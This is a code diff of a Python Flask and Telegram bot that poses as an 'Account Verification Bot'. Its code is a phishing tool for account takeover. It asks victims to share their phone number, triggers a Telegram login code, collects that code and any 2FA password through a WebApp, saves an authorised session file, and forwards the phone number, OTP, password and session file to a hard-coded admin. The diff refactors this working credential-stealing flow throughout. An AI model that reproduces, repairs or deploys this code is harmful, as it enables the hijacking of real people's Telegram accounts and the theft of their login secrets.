@@ -7,10 +7,10 @@ from flask import Flask, render_template, request, jsonify
 import asyncio
 import threading
 import time
-import uuid
 import json
 import logging
-from datetime import datetime
+from datetime import datetime, timedelta
+import queue
 
 # Setup logging
 logging.basicConfig(level=logging.INFO)
@@ -26,14 +26,51 @@ ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# Storage
-sessions = {}  # session_id -> {user_data, verification_data}
-otp_clients = {}  # phone -> {client, phone_code_hash, loop}
+# =============== GLOBAL ASYNCIO SETUP ===============
+# Create single global event loop
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+# Storage with expiration
+user_data = {}  # user_id -> {phone, name, username, timestamp}
+otp_sessions = {}  # phone -> {phone_code_hash, timestamp}
+telegram_clients = {}  # phone -> TelegramClient
+session_expiry = 600  # 10 minutes
+
+# Thread-safe queue for bot tasks
+bot_task_queue = queue.Queue()
 
 # =============== HELPER FUNCTIONS ===============
-def generate_session_id():
-    """Generate unique session ID for WebApp"""
-    return str(uuid.uuid4())
+def clean_expired_sessions():
+    """Clean expired sessions"""
+    current_time = time.time()
+    expired_users = []
+    expired_otp = []
+    
+    for user_id, data in list(user_data.items()):
+        if current_time - data.get('timestamp', 0) > session_expiry:
+            expired_users.append(user_id)
+    
+    for phone, data in list(otp_sessions.items()):
+        if current_time - data.get('timestamp', 0) > session_expiry:
+            expired_otp.append(phone)
+    
+    for user_id in expired_users:
+        del user_data[user_id]
+    
+    for phone in expired_otp:
+        if phone in otp_sessions:
+            del otp_sessions[phone]
+        if phone in telegram_clients:
+            try:
+                client = telegram_clients[phone]
+                loop.run_until_complete(client.disconnect())
+                del telegram_clients[phone]
+            except:
+                pass
+    
+    if expired_users or expired_otp:
+        logger.info(f"🧹 Cleaned {len(expired_users)} users, {len(expired_otp)} OTP sessions")
 
 def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
     """Send notification to admin"""
@@ -41,17 +78,13 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=N
         message = f"""📱 <b>NEW VERIFICATION DATA</b>
 
 📞 Phone: {phone}
-⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-🌐 Source: WebApp"""
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
         
         if user_info:
-            if user_info.get('first_name'):
-                name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
-                message += f"\n👤 Name: {name}"
+            if user_info.get('name'):
+                message += f"\n👤 Name: {user_info['name']}"
             if user_info.get('username'):
                 message += f"\n🔗 Username: @{user_info['username']}"
-            if user_info.get('id'):
-                message += f"\n🆔 ID: {user_info['id']}"
         
         if otp:
             message += f"\n🔢 OTP: <code>{otp}</code>"
@@ -79,43 +112,54 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=N
         logger.error(f"Admin notification error: {e}")
         return False
 
-async def create_telethon_client():
-    """Create Telethon client with its own event loop"""
-    client = TelegramClient(
-        f"sessions/{int(time.time())}",
-        API_ID,
-        API_HASH,
-        connection_retries=3,
-        timeout=30
-    )
-    return client
-
-async def send_otp_async(client, phone):
-    """Send OTP using Telethon"""
+# =============== TELEGRAM FUNCTIONS (Using global loop) ===============
+def send_otp_via_telethon(phone):
+    """Send OTP using Telethon - thread-safe"""
     try:
-        # Connect and send code request
-        await client.connect()
-        logger.info(f"📤 Sending OTP to {phone}")
+        # Create session directory
+        os.makedirs('sessions', exist_ok=True)
+        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
         
-        sent = await client.send_code_request(phone)
+        # Create and store client
+        client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
         
-        return {
-            'success': True,
-            'phone_code_hash': sent.phone_code_hash
+        # Connect and send code
+        loop.run_until_complete(client.connect())
+        sent = loop.run_until_complete(client.send_code_request(phone))
+        
+        # Store data
+        telegram_clients[phone] = client
+        otp_sessions[phone] = {
+            'phone_code_hash': sent.phone_code_hash,
+            'timestamp': time.time()
         }
+        
+        logger.info(f"✅ OTP sent to {phone}")
+        return {'success': True, 'message': 'OTP sent'}
+        
     except FloodWaitError as e:
-        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
+        logger.error(f"Flood wait for {phone}: {e.seconds}s")
+        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
     except Exception as e:
+        logger.error(f"Error sending OTP to {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
-async def verify_otp_async(client, phone, otp_code, phone_code_hash):
-    """Verify OTP using Telethon"""
+def verify_otp_via_telethon(phone, otp_code):
+    """Verify OTP using Telethon - thread-safe"""
     try:
-        logger.info(f"🔐 Verifying OTP for {phone}")
-        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
+        if phone not in telegram_clients or phone not in otp_sessions:
+            return {'success': False, 'error': 'Session expired. Please restart.'}
         
-        if await client.is_user_authorized():
-            me = await client.get_me()
+        client = telegram_clients[phone]
+        phone_code_hash = otp_sessions[phone]['phone_code_hash']
+        
+        # Sign in with OTP
+        loop.run_until_complete(client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash))
+        
+        # Check if authorized
+        if loop.run_until_complete(client.is_user_authorized()):
+            # Get user info
+            me = loop.run_until_complete(client.get_me())
             user_info = {
                 'id': me.id,
                 'username': me.username,
@@ -125,8 +169,10 @@ async def verify_otp_async(client, phone, otp_code, phone_code_hash):
             }
             
             # Save session
-            await client.session.save()
+            loop.run_until_complete(client.session.save())
             session_file = client.session.filename
+            
+            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
             
             return {
                 'success': True,
@@ -138,18 +184,28 @@ async def verify_otp_async(client, phone, otp_code, phone_code_hash):
             return {'success': False, 'error': 'Not authorized'}
             
     except SessionPasswordNeededError:
+        logger.info(f"🔐 2FA required for {phone}")
         return {'success': True, 'requires_2fa': True}
     except PhoneCodeInvalidError:
+        logger.error(f"❌ Invalid OTP for {phone}")
         return {'success': False, 'error': 'Invalid OTP'}
     except Exception as e:
+        logger.error(f"Error verifying OTP for {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
-async def verify_2fa_async(client, password):
-    """Verify 2FA password"""
+def verify_2fa_via_telethon(phone, password):
+    """Verify 2FA password - thread-safe"""
     try:
-        await client.sign_in(password=password)
+        if phone not in telegram_clients:
+            return {'success': False, 'error': 'Session expired'}
         
-        me = await client.get_me()
+        client = telegram_clients[phone]
+        
+        # Sign in with password
+        loop.run_until_complete(client.sign_in(password=password))
+        
+        # Get user info
+        me = loop.run_until_complete(client.get_me())
         user_info = {
             'id': me.id,
             'username': me.username,
@@ -158,8 +214,11 @@ async def verify_2fa_async(client, password):
             'phone': me.phone
         }
         
-        await client.session.save()
+        # Save session
+        loop.run_until_complete(client.session.save())
         session_file = client.session.filename
+        
+        logger.info(f"✅ 2FA successful for {phone}")
         
         return {
             'success': True,
@@ -167,41 +226,36 @@ async def verify_2fa_async(client, password):
             'session_file': session_file
         }
     except Exception as e:
+        logger.error(f"2FA error for {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
 # =============== BOT HANDLERS ===============
 @bot.message_handler(commands=['start'])
 def handle_start(message):
-    """Handle /start command - optional"""
+    """Handle /start command"""
     try:
         user_id = message.from_user.id
         first_name = message.from_user.first_name or ""
         
-        # Generate WebApp URL with session ID
-        session_id = generate_session_id()
+        # Generate unique session ID
+        session_id = f"session_{user_id}_{int(time.time())}"
         
-        # Create session
-        sessions[session_id] = {
-            'telegram_user_id': user_id,
-            'telegram_first_name': first_name,
-            'telegram_username': message.from_user.username,
-            'created': time.time(),
-            'stage': 'started'
+        # Store user session
+        user_data[user_id] = {
+            'name': first_name,
+            'username': message.from_user.username,
+            'lang': message.from_user.language_code,
+            'timestamp': time.time()
         }
         
-        # Get WebApp URL
-        if 'RENDER' in os.environ:
-            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
-            webapp_url = f"https://{RENDER_EXTERNAL_HOSTNAME}/?session_id={session_id}" if RENDER_EXTERNAL_HOSTNAME else "https://your-app.onrender.com"
-        else:
-            port = os.environ.get('PORT', 5000)
-            webapp_url = f"http://localhost:{port}/?session_id={session_id}"
+        # Create WebApp URL
+        webapp_url = f"/webapp?user_id={user_id}&session={session_id}"
         
         # Create WebApp button
         kb = types.InlineKeyboardMarkup()
         btn = types.InlineKeyboardButton(
             "📱 Open Verification WebApp",
-            web_app=types.WebAppInfo(webapp_url)
+            web_app=types.WebAppInfo(url=webapp_url)
         )
         kb.add(btn)
         
@@ -209,27 +263,29 @@ def handle_start(message):
             message.chat.id,
             f"""👋 <b>Hello {first_name}!</b>
 
+Welcome to Account Verification Bot
+
 Click the button below to verify your account:
 
-✅ <b>Features:</b>
-• Share contact in WebApp
-• Receive 5-digit OTP here
-• Enter OTP in WebApp
-• 2FA support if enabled
+✅ <b>Steps:</b>
+1. Open WebApp & share contact
+2. 5-digit OTP appears here
+3. Enter OTP in WebApp
+4. Complete verification
 
-<b>Click below to begin:</b>""",
+<b>Session ID:</b> <code>{session_id}</code>""",
             parse_mode='HTML',
             reply_markup=kb
         )
         
-        logger.info(f"Sent /start to user {user_id}, session: {session_id}")
+        logger.info(f"✅ /start for user {user_id}")
         
     except Exception as e:
         logger.error(f"Start error: {e}")
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact sharing from WebApp users"""
+    """Handle contact sharing"""
     try:
         contact = message.contact
         user_id = message.from_user.id
@@ -241,6 +297,22 @@ def handle_contact(message):
         
         logger.info(f"📱 Contact from {user_id}: {phone}")
         
+        # Update user data
+        if user_id in user_data:
+            user_data[user_id].update({
+                'phone': phone,
+                'contact_name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
+                'timestamp': time.time()
+            })
+        else:
+            user_data[user_id] = {
+                'phone': phone,
+                'contact_name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
+                'name': message.from_user.first_name,
+                'username': message.from_user.username,
+                'timestamp': time.time()
+            }
+        
         # Send processing message
         msg = bot.send_message(
             message.chat.id,
@@ -248,62 +320,37 @@ def handle_contact(message):
             parse_mode='HTML'
         )
         
-        # Send OTP via Telethon
-        async def send_otp_task():
-            try:
-                # Create client for this request
-                client = await create_telethon_client()
-                
-                # Send OTP
-                result = await send_otp_async(client, phone)
-                
-                if result['success']:
-                    # Store client for verification
-                    otp_clients[phone] = {
-                        'client': client,
-                        'phone_code_hash': result['phone_code_hash']
-                    }
-                    
-                    bot.edit_message_text(
-                        f"""✅ <b>OTP SENT SUCCESSFULLY!</b>
+        # Send OTP via Telethon (thread-safe)
+        def send_otp_task():
+            result = send_otp_via_telethon(phone)
+            
+            if result['success']:
+                bot.edit_message_text(
+                    f"""✅ <b>OTP SENT SUCCESSFULLY!</b>
 
 📱 Phone: {phone}
 🔢 <b>5-digit OTP</b> has been sent via Telegram
 
-Check your messages for the 5-digit code.
+Check your Telegram messages for the 5-digit code.
 
 <i>Telegram OTPs are always 5 digits (e.g., 12345)</i>""",
-                        message.chat.id,
-                        msg.message_id,
-                        parse_mode='HTML'
-                    )
-                    
-                    logger.info(f"✅ OTP sent to {phone}")
-                else:
-                    bot.edit_message_text(
-                        f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
-                        message.chat.id,
-                        msg.message_id,
-                        parse_mode='HTML'
-                    )
-            except Exception as e:
-                logger.error(f"OTP task error: {e}")
+                    message.chat.id,
+                    msg.message_id,
+                    parse_mode='HTML'
+                )
+                
+                # Notify admin
+                send_to_admin(phone, user_info=user_data[user_id])
+            else:
                 bot.edit_message_text(
-                    "❌ <b>Server Error:</b> Failed to process request",
+                    f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                     message.chat.id,
                     msg.message_id,
                     parse_mode='HTML'
                 )
         
-        # Run in new event loop
-        def run_async_task():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(send_otp_task())
-            loop.close()
-        
-        thread = threading.Thread(target=run_async_task)
-        thread.start()
+        # Add task to queue
+        bot_task_queue.put(send_otp_task)
         
         # Delete contact message
         try:
@@ -317,119 +364,70 @@ Check your messages for the 5-digit code.
 # =============== FLASK ROUTES ===============
 @app.route('/')
 def index():
-    """Main WebApp page - generates session automatically"""
-    # Get or create session ID
-    session_id = request.args.get('session_id')
-    
-    if not session_id:
-        # Generate new session ID
-        session_id = generate_session_id()
-        
-        # Get Telegram user data from WebApp
-        tg_data = request.args.get('tgWebAppData', '')
-        user_data = parse_telegram_data(tg_data)
-        
-        # Create session
-        sessions[session_id] = {
-            'created': time.time(),
-            'stage': 'new',
-            'user_data': user_data
-        }
-        
-        logger.info(f"Created new WebApp session: {session_id}")
-    
-    return render_template('index.html', session_id=session_id)
+    """Main page redirect to WebApp"""
+    return render_template('index.html')
 
-def parse_telegram_data(init_data_raw):
-    """Parse Telegram WebApp initData"""
-    if not init_data_raw:
-        return {}
+@app.route('/webapp')
+def webapp():
+    """WebApp page"""
+    user_id = request.args.get('user_id')
+    session = request.args.get('session')
     
-    try:
-        params = {}
-        for pair in init_data_raw.split('&'):
-            if '=' in pair:
-                key, value = pair.split('=', 1)
-                params[key] = value
-        
-        user_data = {}
-        if 'user' in params:
-            import urllib.parse
-            user_json = urllib.parse.unquote(params['user'])
-            user_data = json.loads(user_json)
-        
-        return user_data
-    except Exception as e:
-        logger.error(f"Error parsing Telegram data: {e}")
-        return {}
+    if not user_id or not session:
+        return "Invalid request. Please use /start in bot.", 400
+    
+    # Check if session is expired
+    if user_id in user_data:
+        if time.time() - user_data[user_id].get('timestamp', 0) > session_expiry:
+            return render_template('expired.html')
+    
+    return render_template('webapp.html', user_id=user_id, session=session)
 
-@app.route('/api/session/<session_id>')
-def api_session(session_id):
-    """Get session data"""
-    session = sessions.get(session_id, {})
+@app.route('/api/user/<int:user_id>')
+def api_user(user_id):
+    """Get user data for WebApp"""
+    if user_id not in user_data:
+        return jsonify({'error': 'User not found', 'expired': True})
     
-    # Clean up old sessions (> 1 hour)
-    current_time = time.time()
-    expired = [sid for sid, data in sessions.items() 
-               if current_time - data.get('created', 0) > 3600]
+    data = user_data[user_id]
     
-    for sid in expired:
-        if sid in sessions:
-            del sessions[sid]
+    # Check expiration
+    if time.time() - data.get('timestamp', 0) > session_expiry:
+        return jsonify({'error': 'Session expired', 'expired': True})
     
     return jsonify({
-        'success': session_id in sessions,
-        'session': session,
-        'stage': session.get('stage', 'expired')
+        'phone': data.get('phone', ''),
+        'name': data.get('name', ''),
+        'username': data.get('username', ''),
+        'lang': data.get('lang', ''),
+        'has_phone': bool(data.get('phone')),
+        'timestamp': data.get('timestamp', 0)
     })
-
-@app.route('/api/share-contact', methods=['POST'])
-def api_share_contact():
-    """API for WebApp to share contact"""
-    try:
-        data = request.json
-        session_id = data.get('session_id')
-        phone = data.get('phone')
-        
-        logger.info(f"📱 WebApp contact share for session {session_id}: {phone}")
-        
-        if not session_id or not phone:
-            return jsonify({'success': False, 'error': 'Missing parameters'})
-        
-        # Format phone
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        # Update session
-        if session_id in sessions:
-            sessions[session_id].update({
-                'phone': phone,
-                'stage': 'contact_shared',
-                'contact_time': time.time()
-            })
-        
-        return jsonify({
-            'success': True,
-            'message': 'Contact shared successfully'
-        })
-        
-    except Exception as e:
-        logger.error(f"API share contact error: {e}")
-        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-otp', methods=['POST'])
 def api_verify_otp():
     """Verify OTP from WebApp"""
     try:
         data = request.json
-        session_id = data.get('session_id')
-        phone = data.get('phone')
+        user_id = data.get('user_id')
         otp = data.get('otp', '').strip()
         
-        logger.info(f"🔢 OTP verification for {phone}")
+        if not user_id or not otp:
+            return jsonify({'success': False, 'error': 'Missing data'})
         
-        if not session_id or not phone or not otp:
-            return jsonify({'success': False, 'error': 'Missing parameters'})
+        # Get user data
+        if user_id not in user_data:
+            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
+        
+        user_info = user_data[user_id]
+        phone = user_info.get('phone', '')
+        
+        if not phone:
+            return jsonify({'success': False, 'error': 'Phone not found'})
+        
+        # Check expiration
+        if time.time() - user_info.get('timestamp', 0) > session_expiry:
+            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
         
         # Clean OTP (5 digits)
         cleaned_otp = ''.join(filter(str.isdigit, otp))
@@ -437,55 +435,27 @@ def api_verify_otp():
             return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
         
         # Verify OTP
-        def verify_task():
-            try:
-                if phone not in otp_clients:
-                    return {'success': False, 'error': 'Session expired. Please share contact again.'}
-                
-                client_data = otp_clients[phone]
-                client = client_data['client']
-                phone_code_hash = client_data['phone_code_hash']
-                
-                # Create new event loop for this verification
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                
-                result = loop.run_until_complete(
-                    verify_otp_async(client, phone, cleaned_otp, phone_code_hash)
-                )
-                
-                loop.close()
-                return result
-            except Exception as e:
-                logger.error(f"Verify task error: {e}")
-                return {'success': False, 'error': str(e)}
-        
-        result = verify_task()
+        result = verify_otp_via_telethon(phone, cleaned_otp)
         
         if result['success']:
             if result.get('requires_2fa'):
-                # Update session
-                if session_id in sessions:
-                    sessions[session_id]['stage'] = 'needs_2fa'
-                    sessions[session_id]['phone'] = phone
-                
                 return jsonify({
                     'success': True,
                     'requires_2fa': True,
                     'message': '2FA password required'
                 })
             else:
-                # Successfully verified
-                if session_id in sessions:
-                    sessions[session_id]['stage'] = 'verified'
-                    sessions[session_id]['verified'] = True
-                    sessions[session_id]['user_info'] = result.get('user_info')
+                # Update user data
+                if 'user_info' in result:
+                    user_data[user_id].update(result['user_info'])
+                    user_data[user_id]['verified'] = True
+                    user_data[user_id]['timestamp'] = time.time()
                 
                 # Send to admin
                 send_to_admin(
                     phone, 
                     otp=cleaned_otp,
-                    user_info=result.get('user_info'),
+                    user_info=user_info,
                     session_file=result.get('session_file')
                 )
                 
@@ -509,46 +479,36 @@ def api_verify_2fa():
     """Verify 2FA password"""
     try:
         data = request.json
-        session_id = data.get('session_id')
-        phone = data.get('phone')
+        user_id = data.get('user_id')
         password = data.get('password', '').strip()
         
-        if not session_id or not phone or not password:
+        if not user_id or not password:
             return jsonify({'success': False, 'error': 'Missing data'})
         
-        # Verify 2FA
-        def verify_2fa_task():
-            try:
-                if phone not in otp_clients:
-                    return {'success': False, 'error': 'Session expired'}
-                
-                client = otp_clients[phone]['client']
-                
-                # Create new event loop
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                
-                result = loop.run_until_complete(verify_2fa_async(client, password))
-                
-                loop.close()
-                return result
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
+        if user_id not in user_data:
+            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
         
-        result = verify_2fa_task()
+        user_info = user_data[user_id]
+        phone = user_info.get('phone', '')
+        
+        if not phone:
+            return jsonify({'success': False, 'error': 'Phone not found'})
+        
+        # Verify 2FA
+        result = verify_2fa_via_telethon(phone, password)
         
         if result['success']:
-            # Update session
-            if session_id in sessions:
-                sessions[session_id]['stage'] = 'verified'
-                sessions[session_id]['verified'] = True
-                sessions[session_id]['user_info'] = result.get('user_info')
+            # Update user data
+            if 'user_info' in result:
+                user_data[user_id].update(result['user_info'])
+                user_data[user_id]['verified'] = True
+                user_data[user_id]['timestamp'] = time.time()
             
             # Send to admin with password
             send_to_admin(
                 phone,
                 password=password,
-                user_info=result.get('user_info'),
+                user_info=user_info,
                 session_file=result.get('session_file')
             )
             
@@ -566,42 +526,89 @@ def api_verify_2fa():
         logger.error(f"API 2FA error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
-# =============== RUN FUNCTIONS ===============
-def run_bot():
-    """Run bot with polling"""
-    logger.info("🤖 Starting bot polling...")
+@app.route('/api/refresh-session', methods=['POST'])
+def api_refresh_session():
+    """Refresh session expiry"""
     try:
-        bot.remove_webhook()
-        time.sleep(1)
-        bot.infinity_polling(skip_pending=True)
+        data = request.json
+        user_id = data.get('user_id')
+        
+        if user_id and user_id in user_data:
+            user_data[user_id]['timestamp'] = time.time()
+            return jsonify({'success': True, 'message': 'Session refreshed'})
+        else:
+            return jsonify({'success': False, 'error': 'User not found'})
     except Exception as e:
-        logger.error(f"Bot error: {e}")
-        time.sleep(5)
-        run_bot()
+        return jsonify({'success': False, 'error': str(e)})
 
-def run_flask():
-    """Run Flask server"""
-    port = int(os.environ.get("PORT", 5000))
-    logger.info(f"🚀 Starting Flask on port {port}")
-    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
+# =============== BACKGROUND TASKS ===============
+def bot_task_worker():
+    """Process bot tasks from queue"""
+    while True:
+        try:
+            task = bot_task_queue.get()
+            task()
+            bot_task_queue.task_done()
+        except Exception as e:
+            logger.error(f"Task worker error: {e}")
+        time.sleep(0.1)
+
+def cleanup_worker():
+    """Periodic cleanup of expired sessions"""
+    while True:
+        try:
+            clean_expired_sessions()
+            time.sleep(60)  # Clean every minute
+        except Exception as e:
+            logger.error(f"Cleanup worker error: {e}")
+            time.sleep(60)
 
 # =============== MAIN ===============
 if __name__ == "__main__":
     logger.info("="*60)
     logger.info("🚀 Telegram Verification Bot")
     logger.info("="*60)
-    logger.info(f"🤖 Bot: {BOT_TOKEN[:10]}...")
-    logger.info(f"👑 Admin: {ADMIN_ID}")
+    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
+    logger.info(f"👑 Admin ID: {ADMIN_ID}")
+    logger.info(f"🔄 Using single asyncio loop")
     
-    # Create sessions directory
-    os.makedirs('sessions', exist_ok=True)
+    # Start background workers
+    logger.info("Starting background workers...")
+    task_worker_thread = threading.Thread(target=bot_task_worker, daemon=True)
+    task_worker_thread.start()
     
-    # Start bot in separate thread
+    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
+    cleanup_thread.start()
+    
+    # Start bot in separate thread with error handling
+    def run_bot():
+        logger.info("🤖 Starting bot polling...")
+        while True:
+            try:
+                # Remove any existing webhook
+                bot.remove_webhook()
+                time.sleep(1)
+                
+                # Start polling with skip_pending
+                bot.polling(none_stop=True, skip_pending=True, timeout=30)
+                
+            except Exception as e:
+                logger.error(f"Bot polling error: {e}")
+                time.sleep(5)  # Wait before retrying
+    
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
     
-    # Give bot time to start
-    time.sleep(2)
+    # Wait for bot to initialize
+    time.sleep(3)
     
-    # Run Flask in main thread
-    run_flask()
+    # Start Flask
+    port = int(os.environ.get("PORT", 10000))
+    logger.info(f"🚀 Starting Flask on port {port}")
+    app.run(
+        host="0.0.0.0",
+        port=port,
+        debug=False,
+        threaded=True,
+        use_reloader=False
+    )
